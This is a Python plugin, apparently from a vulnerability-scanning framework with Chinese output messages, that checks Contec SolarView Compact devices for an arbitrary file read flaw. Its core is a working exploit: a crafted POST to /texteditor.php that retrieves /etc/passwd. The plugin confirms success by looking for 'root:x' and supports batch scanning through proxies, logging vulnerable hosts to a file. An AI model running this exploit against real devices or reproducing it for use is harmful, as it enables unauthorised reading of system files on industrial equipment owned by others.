#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class SolarView_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/texteditor.php"
            data = "directory=%2Fetc%2F&file=passwd&open=%8AJ%82%AD&r_charset=none&newfile=&contents=&w_charset=none&w_delimit=lf&editfile="
            req = requests.post(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,data=data)
            if "root:x" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("SolarView", '目标存在Contec SolarView Compact任意文件读取漏洞')
                    OutPrintInfo("SolarView", url)
                else:
                    OutPrintInfoSuc("SolarView", f'目标存在Contec SolarView Compact任意文件读取漏洞: {url}')
                    OutPutFile("solarview_file_read.txt",f'目标存在Contec SolarView Compact任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SolarView", f'目标 {input_url} 不存在Contec SolarView Compact任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("SolarView",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("SolarView", '开始检测Contec SolarView Compact任意文件读取漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("SolarView", 'Contec SolarView Compact任意文件读取漏洞检测结束')

